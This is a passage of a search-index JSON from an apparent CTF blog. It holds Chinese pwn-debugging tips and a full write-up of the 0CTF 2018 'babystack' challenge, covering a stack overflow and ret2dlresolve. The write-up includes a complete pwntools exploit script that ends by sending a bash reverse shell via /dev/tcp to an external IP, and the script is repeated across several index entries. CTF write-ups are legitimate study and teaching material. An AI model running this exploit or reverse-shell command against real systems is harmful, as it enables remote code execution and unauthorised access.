            "location": "/note/build-libc-with-debug-info/#note",
            "text": "\u7de8\u8b6f 32 bit \u7248\u672c\u7684 glibc   CC  gcc -m32    CFLAGS  host=i686-linux-gnu  build=i686-linux-gnu     CC = 'gcc -m32'   CFLAGS = '-g3 -ggdb3 -gdwarf-4 -Og -Wno-error --host=i686-linux-gnu --bulid=i686-linux-gnu'  ../configure --prefix = /home/ ` whoami ` /glibc",
            "title": "Note"
        },
        {
            "location": "/note/pwn-tips/",
            "text": "Pwn tips\n\n\nBefore Pwn\n\n\nalarm\n\n\n\u5982\u679c\u6709 \nalarm\n \u505a timeout \u4e14\u78ba\u5b9a\u984c\u76ee\u7684\u6d1e\u4e0d\u5728 \nalarm\n \u88e1\uff0c\u53ef\u4ee5\u5c07\u5b83 patch \u6210 \nisnan\n\n\n\n\n\u628a binary \u7528 vim \u6253\u958b\n\n\n\u5c07 \nalarm\n \u7684 function name \u53d6\u4ee3\u70ba \nisnan\n \u5132\u5b58\n\n\n\u5b8c\u6210\n\n\n\n\nlink libc with debug info\n\n\n\u4e00\u822c\u4f7f\u7528 gdb debug \u7684\u6642\u5019\uff0c\u9032\u5165 libc \u7684 function \u4e2d\u4e0d\u6703 symbol \u7b49\u8cc7\u8a0a\u3002\u9019\u6a23\u6bd4\u8f03\u96e3 debug \u6240\u4ee5\u6703\u5e0c\u671b\u53ef\u4ee5 link \u5230\u4e00\u500b\u6709 debug info \u7684 libc\n\n\n\n\n\u53c3\u8003 \nBuild libc with debug info\n \u5148\u7de8\u51fa\u4e00\u500b\u5e36\u6709 debug info \u7684 libc\n\n\n\u4f7f\u7528 \nldd <binary>\n \u67e5\u770b link \u5230\u7684 loader\n\n\n\u5c07 loader \u8def\u5f91 patch \u6210\u81ea\u5df1\u7de8\u7684 loader \u8def\u5f91\n\n\n\u5b8c\u6210\n\n\n\n\npatch loader \u8def\u5f91\u7684\u5c0f\u6280\u5de7\n\n\n\u5047\u8a2d\u539f\u672c loader \u8def\u5f91\u70ba \n/lib64/ld-linux-x86-64.so.2\n\uff0c\u53ef\u4ee5\u5148\u5efa\u4e00\u500b soft link \n/lib64/ld_linux-x86-64.so.2\n \u6307\u5411\u81ea\u5df1\u7de8\u7684 loader\uff0c\u63a5\u8457\u53ea\u8981\u628a binary loader \u8def\u5f91\u4e2d\u7684 \nld-\n \u63db\u6210 \nld_\n \u5373\u53ef\n\n\nnote\n\n\n\u66f4\u63db loader \u5f8c\u4ed6\u5c31\u6703\u512a\u5148\u4f7f\u7528\u8a72\u76ee\u9304\u4e0b\u7684 libc\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5 link \u5230\u6709 debug info \u7684 libc \u56c9",
            "title": "Pwn tips"
        },
        {
            "location": "/note/pwn-tips/#pwn-tips",
            "text": "",
            "title": "Pwn tips"
        },
        {
            "location": "/note/pwn-tips/#before-pwn",
            "text": "",
            "title": "Before Pwn"
        },
        {
            "location": "/note/pwn-tips/#alarm",
            "text": "\u5982\u679c\u6709  alarm  \u505a timeout \u4e14\u78ba\u5b9a\u984c\u76ee\u7684\u6d1e\u4e0d\u5728  alarm  \u88e1\uff0c\u53ef\u4ee5\u5c07\u5b83 patch \u6210  isnan   \u628a binary \u7528 vim \u6253\u958b  \u5c07  alarm  \u7684 function name \u53d6\u4ee3\u70ba  isnan  \u5132\u5b58  \u5b8c\u6210",
            "title": "alarm"
        },
        {
            "location": "/note/pwn-tips/#link-libc-with-debug-info",
            "text": "\u4e00\u822c\u4f7f\u7528 gdb debug \u7684\u6642\u5019\uff0c\u9032\u5165 libc \u7684 function \u4e2d\u4e0d\u6703 symbol \u7b49\u8cc7\u8a0a\u3002\u9019\u6a23\u6bd4\u8f03\u96e3 debug \u6240\u4ee5\u6703\u5e0c\u671b\u53ef\u4ee5 link \u5230\u4e00\u500b\u6709 debug info \u7684 libc   \u53c3\u8003  Build libc with debug info  \u5148\u7de8\u51fa\u4e00\u500b\u5e36\u6709 debug info \u7684 libc  \u4f7f\u7528  ldd <binary>  \u67e5\u770b link \u5230\u7684 loader  \u5c07 loader \u8def\u5f91 patch \u6210\u81ea\u5df1\u7de8\u7684 loader \u8def\u5f91  \u5b8c\u6210",
            "title": "link libc with debug info"
        },
        {
            "location": "/note/pwn-tips/#patch-loader",
            "text": "\u5047\u8a2d\u539f\u672c loader \u8def\u5f91\u70ba  /lib64/ld-linux-x86-64.so.2 \uff0c\u53ef\u4ee5\u5148\u5efa\u4e00\u500b soft link  /lib64/ld_linux-x86-64.so.2  \u6307\u5411\u81ea\u5df1\u7de8\u7684 loader\uff0c\u63a5\u8457\u53ea\u8981\u628a binary loader \u8def\u5f91\u4e2d\u7684  ld-  \u63db\u6210  ld_  \u5373\u53ef",
            "title": "patch loader \u8def\u5f91\u7684\u5c0f\u6280\u5de7"
        },
        {
            "location": "/note/pwn-tips/#note",
            "text": "\u66f4\u63db loader \u5f8c\u4ed6\u5c31\u6703\u512a\u5148\u4f7f\u7528\u8a72\u76ee\u9304\u4e0b\u7684 libc\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5 link \u5230\u6709 debug info \u7684 libc \u56c9",
            "title": "note"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/",
            "text": "0CTF 2018 Quals: Baby Stack\n\n\n\n\nChallenge link: \nbabystack\n\n\nCategory: Pwn\n\n\nWriteup: \nhttps://ss8651twtw.github.io/blog/writeup/0CTF-2018-Quals:Baby-Stack/\n\n\n\n\n\n\nInfo leak is no longer required to exploit a stack overflow in 2018.\n\n\nEnjoy the babystack\n\n\n202.120.7.202:6666\n\n\nProtection\n\n\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n\n\n\n\nAnalysis\n\n\n\n\npow.py\n\n\n\n\nIt is a wrapper of babystack.\nAdd proof-of-work and limiting the length of input is \n0x100\n; also pipe stdout and stderr to \n/dev/null\n.\n\n\n\n\nbabystack\n\n\n\n\nJust alarm and read buffer.\n\n\nssize_t\n \nsub_804843B\n()\n\n\n{\n\n  \nchar\n \nbuf\n;\n \n// [esp+0h] [ebp-28h]\n\n\n  \nreturn\n \nread\n(\n0\n,\n \n&\nbuf\n,\n \n0x40u\n);\n\n\n}\n\n\n\nint\n \n__cdecl\n \nmain\n()\n\n\n{\n\n  \nalarm\n(\n0xAu\n);\n\n  \nsub_804843B\n();\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\nVulnerability\n\n\nNo canary found and we can read a lot of characters to buf.\n\n\n\n\nBuffer overflow\n in \nread(0, &buf, 0x40u)\n\n\n\n\nIdea\n\n\n\n\nno output function => cannot do information leak\n\n\nno libc provided => guessing function offset maybe hard\n\n\nNX enabled => read shell code and jump to execute cannot work\n\n\n\n\nAccording to the description, \"info leak is no longer required\", it means that we can use ret2dlresolve skill to pwn it!\n\n\nTry to solve by the following steps:\n\n\n\n\nuse rop to read fake data structures and ret2main\n\n\nuse ret2dlresolve to call \nsystem(\"/bin/sh\")\n\n\n\n\nFake data structures:\n\n\n\n\nElf32_Rel\n\n\n\n\n/* Relocation table entry without addend (in section of type SHT_REL).  */\ntypedef struct\n{\n  Elf32_Addr        r_offset;                /* Address */\n  Elf32_Word        r_info;                        /* Relocation type and symbol index */\n} Elf32_Rel;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#633\n\n\n\n\nElf32_Sym\n\n\n\n\n/* Symbol table entry.  */\ntypedef struct\n{\n  Elf32_Word        st_name;                /* Symbol name (string tbl index) */\n  Elf32_Addr        st_value;                /* Symbol value */\n  Elf32_Word        st_size;                /* Symbol size */\n  unsigned char        st_info;                /* Symbol type and binding */\n  unsigned char        st_other;                /* Symbol visibility */\n  Elf32_Section        st_shndx;                /* Section index */\n} Elf32_Sym;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#518\n\n\nWorking flow about \n_dl_runtime_resolve\n\n\n     _dl_runtime_resolve(link_map, reloc_arg)\n                                       +\n          +-----------+                |\n          | Elf32_Rel | <--------------+\n          +-----------+\n     +--+ | r_offset  |        +-----------+\n     |    |  r_info   | +----> | Elf32_Sym |\n     |    +-----------+        +-----------+      +----------+\n     |      .rel.plt           |  st_name  | +--> | system\\0 |\n     |                         |           |      +----------+\n     v                         +-----------+        .dynstr\n+----+-----+                      .dynsym\n| <system> |\n+----------+\n  .got.plt\n\n\n\n\n\n\n\n\nfake \nElf32_Rel\n\n\n\n\nr_offset\n writable (after resolving symbol write the actual address of function)\n\n\nr_info\n high 24 bits\n\n\n(r_info >> 8) * 16\n point to fake \nElf32_Sym\n (16 is size of \nElf32_Sym\n)\n\n\n\n\n\n\nr_info\n low 8 bits\n\n\nmust be \n0x07\n (R_386_JMP_SLOT)\n\n\n\n\n\n\n\n\n\n\n\n\nfake \nElf32_Sym\n\n\n\n\n.dynstr + st_name\n point to \nsystem\n string\n\n\n\n\n\n\n\n\nRead the fake \nElf32_Rel\n\u3001\nElf32_Sym\n structures and ret2main to call \n_dl_runtime_resolve\n.\n\n\n\n\nuse \nplt0\n\n\n\n\nDisassembly of section .plt:\n\n080482f0 <read@plt-0x10>:                                             // plt0\n 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map\n 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve\n\n\n\n\nWe can calculate the \nreloc_arg\n to make \n.rel.plt + reloc_arg\n point to our fake structures and jump to \nplt0\n, let it resolve symbol to \nsystem\n.\n\n\nAfter resolving the symbol, \n_dl_runtime_resolve\n will call the function.\n\n\nExploitation\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nhashlib\n \nimport\n \nsha256\n\n\nimport\n \ntime\n\n\n\n# r = process('./babystack')\n\n\nr\n \n=\n \nremote\n(\n'202.120.7.202'\n,\n \n6666\n)\n\n\n\ndef\n \nverify\n():\n\n    \ndata\n \n=\n \nr\n.\nrecvline\n()[:\n-\n1\n]\n\n    \nfor\n \ni\n \nin\n \nxrange\n(\n2\n \n**\n \n32\n):\n\n        \nif\n \nsha256\n(\ndata\n \n+\n \np32\n(\ni\n))\n.\ndigest\n()\n.\nstartswith\n(\n'\n\\0\\0\\0\n'\n):\n\n            \nbreak\n\n    \nr\n.\nsend\n(\np32\n(\ni\n))\n\n    \nlog\n.\ninfo\n(\n'POW is over'\n)\n\n    \nsleep\n(\n0.5\n)\n\n\n\ndef\n \nsend\n(\ndata\n,\n \nlength\n):\n\n    \ntime\n.\nsleep\n(\n0.1\n)\n\n    \nr\n.\nsend\n(\ndata\n.\nljust\n(\nlength\n))\n\n\n\nplt0\n \n=\n \n0x80482f0\n\n\nrelplt\n \n=\n \n0x80482b0\n\n\ndynsym\n \n=\n \n0x80481cc\n\n\ndynstr\n \n=\n \n0x804822c\n\n\n\nmain\n \n=\n \n0x8048457\n\n\nread_plt\n \n=\n \n0x8048300\n\n\n\nbuf\n \n=\n \n0x804a500\n\n\n\nrop\n \n=\n \nflat\n(\n\n        \n# _dl_runtime_resolve call and reloc_arg\n\n        \nplt0\n,\n \nbuf\n \n-\n \nrelplt\n,\n \n# will resolve system\n\n        \n0xdeadbeef\n,\n \n# return address\n\n        \nbuf\n \n+\n \n36\n \n# parameter \"/bin/sh\"\n\n        \n)\n\n\n\ndata\n \n=\n \nflat\n(\n\n        \n# Elf32_Rel\n\n        \nbuf\n,\n \n0x7\n \n|\n \n((\nbuf\n \n+\n \n12\n \n-\n \ndynsym\n)\n \n/\n \n16\n)\n \n<<\n \n8\n,\n \n0xdeadbeef\n,\n \n# 0xdeadbeef is padding\n\n        \n# Elf32_Sym\n\n        \nbuf\n \n+\n \n28\n \n-\n \ndynstr\n,\n \n0\n,\n \n0\n,\n \n0x12\n,\n\n        \n'system\n\\x00\\x00\n'\n,\n\n        \n'/bin/sh\n\\x00\n'\n\n        \n)\n\n\n\nverify\n()\n\n\n\n# read data to buf\n\n\nsend\n(\n'a'\n \n*\n \n44\n \n+\n \nflat\n(\nread_plt\n,\n \nmain\n,\n \n0\n,\n \nbuf\n,\n \n44\n),\n \n0x40\n)\n\n\nsend\n(\ndata\n,\n \n44\n)\n\n\n\n# use ret2dlresolve to call system(\"/bin/sh\")\n\n\nsend\n(\n'a'\n \n*\n \n44\n \n+\n \nrop\n,\n \n0x40\n)\n\n\n\n# make a reverse shell\n\n\nsend\n(\n'bash -c \"bash -i &>/dev/tcp/35.201.141.84/80 0>&1\"'\n,\n \n0x100\n)\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag{return_to_dlresolve_for_warming_up}\n\n\nNote\n\n\nhttps://www.slideshare.net/AngelBoy1/re2dlresolve\n\n\nhttps://www.youtube.com/watch?v=wsIvqd9YqTI",
            "title": "0CTF-2018-Quals:Baby-Stack"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#0ctf-2018-quals-baby-stack",
            "text": "Challenge link:  babystack  Category: Pwn  Writeup:  https://ss8651twtw.github.io/blog/writeup/0CTF-2018-Quals:Baby-Stack/    Info leak is no longer required to exploit a stack overflow in 2018.  Enjoy the babystack  202.120.7.202:6666",
            "title": "0CTF 2018 Quals: Baby Stack"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#protection",
            "text": "Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)",
            "title": "Protection"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#analysis",
            "text": "pow.py   It is a wrapper of babystack.\nAdd proof-of-work and limiting the length of input is  0x100 ; also pipe stdout and stderr to  /dev/null .   babystack   Just alarm and read buffer.  ssize_t   sub_804843B ()  { \n   char   buf ;   // [esp+0h] [ebp-28h] \n\n   return   read ( 0 ,   & buf ,   0x40u );  }  int   __cdecl   main ()  { \n   alarm ( 0xAu ); \n   sub_804843B (); \n   return   0 ;  }",
            "title": "Analysis"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#vulnerability",
            "text": "No canary found and we can read a lot of characters to buf.   Buffer overflow  in  read(0, &buf, 0x40u)",
            "title": "Vulnerability"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#idea",
            "text": "no output function => cannot do information leak  no libc provided => guessing function offset maybe hard  NX enabled => read shell code and jump to execute cannot work   According to the description, \"info leak is no longer required\", it means that we can use ret2dlresolve skill to pwn it!  Try to solve by the following steps:   use rop to read fake data structures and ret2main  use ret2dlresolve to call  system(\"/bin/sh\")   Fake data structures:   Elf32_Rel   /* Relocation table entry without addend (in section of type SHT_REL).  */\ntypedef struct\n{\n  Elf32_Addr        r_offset;                /* Address */\n  Elf32_Word        r_info;                        /* Relocation type and symbol index */\n} Elf32_Rel;  https://code.woboq.org/userspace/glibc/elf/elf.h.html#633   Elf32_Sym   /* Symbol table entry.  */\ntypedef struct\n{\n  Elf32_Word        st_name;                /* Symbol name (string tbl index) */\n  Elf32_Addr        st_value;                /* Symbol value */\n  Elf32_Word        st_size;                /* Symbol size */\n  unsigned char        st_info;                /* Symbol type and binding */\n  unsigned char        st_other;                /* Symbol visibility */\n  Elf32_Section        st_shndx;                /* Section index */\n} Elf32_Sym;  https://code.woboq.org/userspace/glibc/elf/elf.h.html#518  Working flow about  _dl_runtime_resolve       _dl_runtime_resolve(link_map, reloc_arg)\n                                       +\n          +-----------+                |\n          | Elf32_Rel | <--------------+\n          +-----------+\n     +--+ | r_offset  |        +-----------+\n     |    |  r_info   | +----> | Elf32_Sym |\n     |    +-----------+        +-----------+      +----------+\n     |      .rel.plt           |  st_name  | +--> | system\\0 |\n     |                         |           |      +----------+\n     v                         +-----------+        .dynstr\n+----+-----+                      .dynsym\n| <system> |\n+----------+\n  .got.plt    fake  Elf32_Rel   r_offset  writable (after resolving symbol write the actual address of function)  r_info  high 24 bits  (r_info >> 8) * 16  point to fake  Elf32_Sym  (16 is size of  Elf32_Sym )    r_info  low 8 bits  must be  0x07  (R_386_JMP_SLOT)       fake  Elf32_Sym   .dynstr + st_name  point to  system  string     Read the fake  Elf32_Rel \u3001 Elf32_Sym  structures and ret2main to call  _dl_runtime_resolve .   use  plt0   Disassembly of section .plt:\n\n080482f0 <read@plt-0x10>:                                             // plt0\n 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map\n 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve  We can calculate the  reloc_arg  to make  .rel.plt + reloc_arg  point to our fake structures and jump to  plt0 , let it resolve symbol to  system .  After resolving the symbol,  _dl_runtime_resolve  will call the function.",
            "title": "Idea"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#exploitation",
            "text": "#!/usr/bin/env python  from   pwn   import   *  from   hashlib   import   sha256  import   time  # r = process('./babystack')  r   =   remote ( '202.120.7.202' ,   6666 )  def   verify (): \n     data   =   r . recvline ()[: - 1 ] \n     for   i   in   xrange ( 2   **   32 ): \n         if   sha256 ( data   +   p32 ( i )) . digest () . startswith ( ' \\0\\0\\0 ' ): \n             break \n     r . send ( p32 ( i )) \n     log . info ( 'POW is over' ) \n     sleep ( 0.5 )  def   send ( data ,   length ): \n     time . sleep ( 0.1 ) \n     r . send ( data . ljust ( length ))  plt0   =   0x80482f0  relplt   =   0x80482b0  dynsym   =   0x80481cc  dynstr   =   0x804822c  main   =   0x8048457  read_plt   =   0x8048300  buf   =   0x804a500  rop   =   flat ( \n         # _dl_runtime_resolve call and reloc_arg \n         plt0 ,   buf   -   relplt ,   # will resolve system \n         0xdeadbeef ,   # return address \n         buf   +   36   # parameter \"/bin/sh\" \n         )  data   =   flat ( \n         # Elf32_Rel \n         buf ,   0x7   |   (( buf   +   12   -   dynsym )   /   16 )   <<   8 ,   0xdeadbeef ,   # 0xdeadbeef is padding \n         # Elf32_Sym \n         buf   +   28   -   dynstr ,   0 ,   0 ,   0x12 , \n         'system \\x00\\x00 ' , \n         '/bin/sh \\x00 ' \n         )  verify ()  # read data to buf  send ( 'a'   *   44   +   flat ( read_plt ,   main ,   0 ,   buf ,   44 ),   0x40 )  send ( data ,   44 )  # use ret2dlresolve to call system(\"/bin/sh\")  send ( 'a'   *   44   +   rop ,   0x40 )  # make a reverse shell  send ( 'bash -c \"bash -i &>/dev/tcp/35.201.141.84/80 0>&1\"' ,   0x100 )  r . interactive ()   flag{return_to_dlresolve_for_warming_up}",
            "title": "Exploitation"
        },
        {
            "location": "/writeup/0CTF-2018-Quals:Baby-Stack/#note",
            "text": "https://www.slideshare.net/AngelBoy1/re2dlresolve  https://www.youtube.com/watch?v=wsIvqd9YqTI",
            "title": "Note"
        }
    ]
}